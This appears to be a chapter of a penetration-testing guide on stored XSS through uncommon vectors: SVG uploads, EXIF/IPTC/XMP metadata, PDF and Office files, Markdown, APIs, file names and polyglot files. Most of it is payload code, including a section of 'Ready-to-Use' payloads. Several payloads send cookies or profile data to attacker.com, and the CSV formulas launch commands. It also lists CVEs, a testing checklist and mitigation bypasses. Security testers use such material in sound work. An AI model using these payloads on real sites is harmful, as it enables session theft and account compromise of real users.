# 07 - Stored XSS: Exotic Storage Vectors

## Overview

Beyond traditional form fields and comments, stored XSS can be achieved through file uploads, metadata injection, document processing, and API interactions. These "exotic" vectors are frequently overlooked by developers and security testers because the injection point is non-obvious -- the payload enters through a file, image metadata, or API mutation rather than a visible text field.

**References:**
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## 1. SVG File Upload XSS

SVG (Scalable Vector Graphics) files are XML documents that can contain embedded JavaScript. When an application accepts SVG uploads and serves them with a content type that allows script execution (`image/svg+xml` or `text/html`), any embedded JavaScript executes in the application's origin.

### 1.1 Basic SVG XSS Vectors

```xml
<!-- Basic script tag in SVG -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

```xml
<!-- SVG onload event -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>
```

**Real-world CVEs:**
- **CVE-2024-4269:** Essential Addons for Elementor (WordPress) -- Author+ stored XSS via SVG file upload due to insufficient SVG content sanitization
- **CVE-2022-33910:** MantisBT stored XSS via SVG file upload
- **GHSA-rcg8-g69v-x23j:** Plane project management tool -- XSS via SVG image upload

**References:**
- https://wpscan.com/vulnerability/8aae7aa1-6170-45d8-903f-8520913276da/
- https://mantisbt.org/bugs/view.php?id=30384
- https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j
- https://hackerone.com/reports/148853

### 1.2 SVG foreignObject Element

The `<foreignObject>` element allows embedding non-SVG content (HTML, XHTML) inside an SVG document. This is one of the most powerful SVG XSS vectors because it permits full HTML including `<script>`, `<iframe>`, and event handlers.

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <foreignObject width="500" height="500">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(document.domain)</script>
    </body>
  </foreignObject>
</svg>
```

```xml
<!-- foreignObject with iframe -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml"
            src="javascript:alert(document.domain)"
            width="400" height="250"/>
  </foreignObject>
</svg>
```

**Reference:** https://bugzilla.mozilla.org/show_bug.cgi?id=1754522 (CVE-2022-28284)

### 1.3 SVG animate and set Elements

The `<animate>` and `<set>` elements support event handlers like `onbegin` and `onend` that execute JavaScript without requiring user interaction.

```xml
<!-- animate onbegin -->
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert(document.domain)" attributeName="x" dur="1s"/>
</svg>

<!-- set onbegin -->
<svg xmlns="http://www.w3.org/2000/svg">
  <set onbegin="alert(document.domain)" attributeName="x" to="1"/>
</svg>

<!-- animateTransform -->
<svg xmlns="http://www.w3.org/2000/svg">
  <animateTransform onbegin="alert(document.domain)" attributeName="transform" type="rotate"/>
</svg>

<!-- animateMotion -->
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <path id="p" d="M0,0 L100,0"/>
  <circle r="5">
    <animateMotion onbegin="alert(document.domain)" dur="1s">
      <mpath href="#p"/>
    </animateMotion>
  </circle>
</svg>
```

**Reference:** https://portswigger.net/research/svg-animate-xss-vector

### 1.4 SVG use Element

The `<use>` element references another SVG element and can be abused to include external SVG files containing XSS payloads:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
</svg>
```

**Reference:** https://insert-script.blogspot.com/2020/09/xss-challenge-solution-svg-use.html

### 1.5 SVG desc and title Elements with Script

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <desc><script>alert(1)</script></desc>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <title><script>alert(1)</script></title>
</svg>
```

---

## 2. Image Metadata XSS

### 2.1 EXIF Injection

EXIF (Exchangeable Image File Format) metadata in JPEG/TIFF images can contain XSS payloads. When applications extract and display EXIF data (camera model, GPS coordinates, description) without encoding, XSS fires.

```bash
# Inject XSS into EXIF Comment field using exiftool
exiftool -Comment='<script>alert(document.domain)</script>' image.jpg

# Inject into multiple EXIF fields
exiftool -Artist='<img src=x onerror=alert(1)>' image.jpg
exiftool -ImageDescription='<svg/onload=alert(1)>' image.jpg
exiftool -Copyright='"><script>alert(document.cookie)</script>' image.jpg
exiftool -UserComment='<details open ontoggle=alert(1)>' image.jpg

# Inject into EXIF GPS field (sometimes displayed on maps)
exiftool -GPSLatitudeRef='<script>alert(1)</script>' image.jpg

# Inject into Camera Model (displayed in photo detail views)
exiftool -Model='<img src=x onerror=alert(document.domain)>' image.jpg
```

### 2.2 IPTC Metadata Injection

IPTC (International Press Telecommunications Council) metadata is used in newsroom and media workflows:

```bash
# Inject into IPTC fields
exiftool -IPTC:Caption-Abstract='<script>alert(1)</script>' image.jpg
exiftool -IPTC:Headline='<img src=x onerror=alert(1)>' image.jpg
exiftool -IPTC:Keywords='<svg/onload=alert(1)>' image.jpg
exiftool -IPTC:Writer-Editor='"><script>alert(1)</script>' image.jpg
exiftool -IPTC:City='<details open ontoggle=alert(1)>' image.jpg
```

### 2.3 XMP Data Injection

XMP (Extensible Metadata Platform) is XML-based metadata embedded in images, PDFs, and other files:

```bash
# Inject into XMP fields
exiftool -XMP:Description='<script>alert(1)</script>' image.jpg
exiftool -XMP:Creator='<img src=x onerror=alert(1)>' image.jpg
exiftool -XMP:Title='<svg/onload=alert(document.domain)>' image.jpg
exiftool -XMP:Rights='"><script>alert(1)</script>' image.jpg
```

**Testing methodology:**
1. Upload image with XSS in metadata
2. Find where the application displays image metadata (gallery view, admin panel, file details, EXIF viewer)
3. Check if metadata values are rendered as HTML or text
4. Test both the main application and any admin/moderation interfaces

---

## 3. Document Upload XSS

### 3.1 PDF JavaScript Execution

PDF files can contain JavaScript that executes in the context of PDF viewers. When web applications use JavaScript-based PDF renderers (like PDF.js), XSS can occur in the application's origin.

**CVE-2024-4367:** Arbitrary JavaScript execution in Mozilla PDF.js. An attacker crafts a malicious PDF that, when opened in any application embedding PDF.js, executes JavaScript in the application's context, leading to full stored XSS. This bug allows an attacker to execute arbitrary JavaScript code as soon as a malicious PDF file is opened. In applications that embed PDF.js, if no mitigations are in place, this essentially gives the attacker an XSS primitive on the hosting domain.

```
# Creating a malicious PDF with JavaScript
# Method 1: Minimal PDF with embedded JS action
%PDF-1.0
1 0 obj<</Pages 2 0 R>>endobj
2 0 obj<</Kids[3 0 R]/Count 1>>endobj
3 0 obj<</AA<</O<</JS(app.alert('XSS'))/S/JavaScript>>>>>/Parent 2 0 R>>endobj
trailer<</Root 1 0 R>>

# Method 2: Using Python reportlab or fpdf to generate PDF with JS
```

**CVE-2025-47943:** Stored XSS in Gogs via malicious PDF upload, where the PDF renderer executed embedded JavaScript in the application context.

**References:**
- https://codeanlabs.com/2024/05/cve-2024-4367-arbitrary-js-execution-in-pdf-js/
- https://www.hacktivesecurity.com/blog/2025/07/15/cve-2025-47943-stored-xss-in-gogs-via-pdf/
- https://gubello.me/blog/pdf-viewers-xss-and-pdf-files/

### 3.2 DOCX/XLSX File Injection

Microsoft Office Open XML formats (DOCX, XLSX, PPTX) are ZIP archives containing XML files. When web applications parse and render these documents in a web viewer:

```xml
<!-- Inject into DOCX document.xml -->
<w:r>
  <w:t><script>alert(1)</script></w:t>
</w:r>

<!-- XLSX formula injection -->
<!-- Cell content that executes when exported/viewed in web interface -->
=HYPERLINK("javascript:alert(1)","Click")
```

**CSV/XLSX formula injection payloads for web rendering:**
```
=cmd|'/C calc'!A0
+cmd|'/C calc'!A0
@SUM(1+1)*cmd|'/C calc'!A0
=IMPORTXML("https://attacker.com/steal?c="&A1, "//x")
-2+3+cmd|'/C calc'!A0
```

**Reference:** https://owasp.org/www-community/attacks/CSV_Injection

### 3.3 HTML File Upload

If an application accepts HTML file uploads and serves them from the same origin (not a sandboxed domain):

```html
<!-- uploaded.html - full XSS in the application's origin -->
<!DOCTYPE html>
<html>
<body>
<script>
  // Steal API data using the application's cookies
  fetch('/api/user/profile', {credentials: 'include'})
    .then(r => r.json())
    .then(d => fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(d)
    }));
</script>
</body>
</html>
```

**Key check:** What `Content-Type` and `Content-Disposition` headers does the server use when serving uploaded HTML files?
- `Content-Type: text/html` + `Content-Disposition: inline` = fully vulnerable
- `Content-Type: application/octet-stream` + `Content-Disposition: attachment` = safe

### 3.4 Markdown Rendering XSS

Markdown renderers that pass raw HTML through or have incomplete sanitization:

```markdown
<!-- Raw HTML passthrough -->
<script>alert(1)</script>

<!-- Image with event handler -->
![xss](x" onerror="alert(1))

<!-- Link with javascript: protocol -->
[click](javascript:alert(1))

<!-- HTML injection in markdown -->
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>click

<!-- Markdown footnote injection (some parsers) -->
[^xss]: <img src=x onerror=alert(1)>
```

**Reference:** https://security.snyk.io/vuln/SNYK-JS-ELECTRONPDF-6253730

---

## 4. API and Webhook XSS

### 4.1 API Response Injection

When data submitted via API is later rendered in a web UI without proper encoding:

```bash
# Inject XSS via API endpoint
curl -X POST https://target.com/api/items \
  -H "Content-Type: application/json" \
  -d '{"name": "<img src=x onerror=alert(document.domain)>", "description": "normal text"}'

# The payload fires when an admin or user views the item in the web dashboard
```

**Vulnerable frontend patterns:**
```javascript
// jQuery .html()
$('#item-name').html(item.name);

// Angular [innerHTML]
// <div [innerHTML]="item.name"></div>

// Vue v-html
// <div v-html="item.name"></div>

// React dangerouslySetInnerHTML
// <div dangerouslySetInnerHTML={{__html: item.name}} />
```

### 4.2 GraphQL Mutation Injection

GraphQL mutations that accept string inputs and whose results are rendered in UIs:

```graphql
mutation {
  createProject(input: {
    name: "<img src=x onerror=alert(document.domain)>"
    description: "<svg/onload=alert(1)>"
  }) {
    id
    name
  }
}
```

### 4.3 WebSocket Message Injection

Chat applications and real-time dashboards that render WebSocket messages as HTML:

```javascript
// Attacker sends via WebSocket
ws.send(JSON.stringify({
  type: "message",
  content: "<img src=x onerror=alert(document.domain)>",
  username: "<svg/onload=alert(1)>"
}));
```

### 4.4 Webhook Payload Injection

When applications receive webhook data from external services and display it in dashboards:

```json
{
  "event": "push",
  "repository": "<img src=x onerror=alert(1)>",
  "commit_message": "<script>alert(document.cookie)</script>",
  "author": "<svg/onload=alert(1)>"
}
```

---

## 5. File Name XSS in Management Interfaces

File management UIs, cloud storage dashboards, and CMS media libraries often render file names as HTML:

```bash
# Create files with XSS in the filename
touch '"><img src=x onerror=alert(1)>.txt'
touch '<svg onload=alert(1)>.png'

# Upload via curl with XSS filename
curl -X POST https://target.com/upload \
  -F "file=@normal.txt;filename=<img src=x onerror=alert(1)>.txt"
```

**Where filename XSS fires:**
- File manager/media library listing
- Download confirmation dialogs
- Activity logs ("User uploaded <filename>")
- Email notifications ("New file: <filename>")
- Admin dashboards showing recent uploads
- Breadcrumb navigation paths
- Share dialogs and link generation pages

---

## 6. Polyglot File Attacks

A polyglot file is simultaneously valid as two or more file formats. This bypasses file type validation while delivering XSS payloads.

### 6.1 JavaScript/JPEG Polyglot

A file that is both a valid JPEG image and valid JavaScript:

```python
# Python script to create a JS/JPEG polyglot
# The JPEG header bytes are crafted to also be valid JS

payload = b'\xff\xd8\xff\xe0' + b'\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
payload += b'\xff\xfe'  # JPEG comment marker
comment = b'*/=alert(document.domain)/*'
payload += len(comment).to_bytes(2, 'big') + comment
payload += b'\xff\xd9'  # JPEG end marker

with open('polyglot.jpg', 'wb') as f:
    f.write(payload)
```

**Exploitation:** If the server serves the file with `Content-Type: text/html` or `text/javascript` based on URL manipulation or content-type sniffing, the embedded JavaScript executes.

**Reference:** https://medium.com/@NehaKumari0xf/exploiting-xss-with-javascript-jpeg-polyglot-eb5fb90f6be4

### 6.2 SVG/HTML Polyglot

```xml
<!-- Valid as both SVG and HTML -->
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <html xmlns="http://www.w3.org/1999/xhtml">
      <body>
        <script>alert(document.domain)</script>
      </body>
    </html>
  </foreignObject>
</svg>
```

### 6.3 GIF/JavaScript Polyglot

```
GIF89a/*<svg/onload=alert(1)>*/=0;
```
This is a valid GIF header followed by a JavaScript comment/payload structure.

### 6.4 ICO/HTML Polyglot

The ICO format allows arbitrary data after the header, which can include HTML/JS when served with an incorrect content type:

```
# ICO header followed by HTML payload
\x00\x00\x01\x00\x01\x00\x10\x10<script>alert(1)</script>
```

---

## 7. Ready-to-Use Exotic Stored XSS Payloads

### SVG Payloads (save as .svg and upload)

```xml
<!-- 1. Minimal SVG XSS -->
<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg"/>

<!-- 2. SVG with script tag -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>

<!-- 3. SVG animate -->
<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin=alert(1) attributeName=x dur=1s/></svg>

<!-- 4. SVG set -->
<svg xmlns="http://www.w3.org/2000/svg"><set onbegin=alert(1) attributeName=x to=1/></svg>

<!-- 5. SVG foreignObject full page takeover -->
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><script>document.location='https://attacker.com/steal?c='+document.cookie</script></body></foreignObject></svg>

<!-- 6. SVG with embedded data exfiltration -->
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/log?d='+btoa(document.cookie))"/>

<!-- 7. SVG with xlink:href javascript -->
<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>

<!-- 8. SVG with embedded event via CSS -->
<svg xmlns="http://www.w3.org/2000/svg"><style>@keyframes x{from{left:0}to{left:1px}}svg{animation:x 1s}*{animation:x 1s}</style><set onbegin="alert(1)" attributeName="x" to="1"/></svg>
```

### Metadata Payloads (exiftool commands)

```bash
# 9. EXIF comment injection
exiftool -Comment='<script>alert(document.domain)</script>' payload.jpg

# 10. EXIF artist field with data exfiltration
exiftool -Artist='<img src=x onerror="fetch(`https://attacker.com/s?c=${document.cookie}`)">' payload.jpg

# 11. XMP description (works in PDF too)
exiftool -XMP:Description='<svg/onload=alert(document.domain)>' payload.jpg

# 12. Multi-field injection for maximum coverage
exiftool -Comment='<script>alert(1)</script>' -Artist='<img src=x onerror=alert(2)>' -Copyright='<svg/onload=alert(3)>' payload.jpg
```

### Document Payloads

```html
<!-- 13. Minimal HTML upload payload -->
<html><body><script>new Image().src='https://attacker.com/?c='+document.cookie;</script></body></html>

<!-- 14. Markdown XSS -->
<img src=x onerror=alert(document.domain)>
```

### API/Webhook Payloads

```json
// 15. JSON payload for API injection
{"name": "<img src=x onerror=alert(document.domain)>"}

// 16. Nested JSON with XSS in deep field
{"user": {"profile": {"bio": "<svg/onload=alert(1)>"}}}
```

### File Name Payloads

```bash
# 17. Upload with XSS filename via multipart form
curl -F "file=@test.txt;filename=\"><img src=x onerror=alert(1)>.txt" https://target.com/upload

# 18. SVG filename XSS
curl -F "file=@test.svg;filename=<svg/onload=alert(1)>.svg" https://target.com/upload
```

---

## 8. Testing Decision Logic for Exotic Vectors

```
FOR each file upload endpoint:
    1. Check accepted file types (SVG, HTML, PDF, DOCX, images)
    2. For SVG: Upload SVG with script tag -> check if JS executes when viewed
    3. For images: Inject EXIF/IPTC/XMP metadata with XSS -> check metadata display pages
    4. For PDF: Upload PDF with JavaScript -> check if PDF.js or viewer executes it
    5. For documents: Check if HTML content is extracted and rendered
    6. Test Content-Type header of served uploads:
       - image/svg+xml or text/html = XSS possible
       - application/octet-stream or text/plain = safe
    7. Check Content-Disposition header:
       - inline = renders in browser (vulnerable)
       - attachment = forces download (safe from XSS)
    8. Test if uploads are served from same origin or sandboxed domain
    9. Check for X-Content-Type-Options: nosniff header
       - Missing = browser may sniff content type (enables polyglot attacks)
    10. For polyglots: attempt content-type confusion attacks

FOR each API endpoint accepting string input:
    1. Inject HTML/JS in every string field
    2. Trace where the stored value is rendered in any web UI
    3. Check if frontend uses innerHTML, v-html, or similar unsafe rendering
    4. Test both regular user views and admin/management views
```

---

## 9. Mitigation Awareness (For Testing Context)

Understanding mitigations helps identify bypasses:

| Mitigation | Bypass Approach |
|-----------|----------------|
| SVG sanitization (strip `<script>`) | Use `<animate onbegin>`, `<set onbegin>`, `<foreignObject>` |
| Content-Type: text/plain for uploads | Test for Content-Type sniffing, missing `X-Content-Type-Options` |
| Content-Disposition: attachment | Test if any endpoint serves the file inline |
| Sandboxed upload domain | Test for same-origin bypass, CORS misconfig |
| EXIF stripping | Test if all metadata fields are stripped, not just common ones |
| HTML sanitizer on API input | Test for mXSS, encoding bypasses, parser differentials |
| File extension whitelist | Test polyglot files, double extensions (.svg.png), null bytes |

**References:**
- https://github.com/gogs/gogs/security/advisories/GHSA-xh32-cx6c-cp4v
- https://github.com/Squidex/squidex/security/advisories/GHSA-xfr4-qg2v-7v5m
- https://aspiainfotech.com/2024/02/22/file-upload-vulnerabilities/
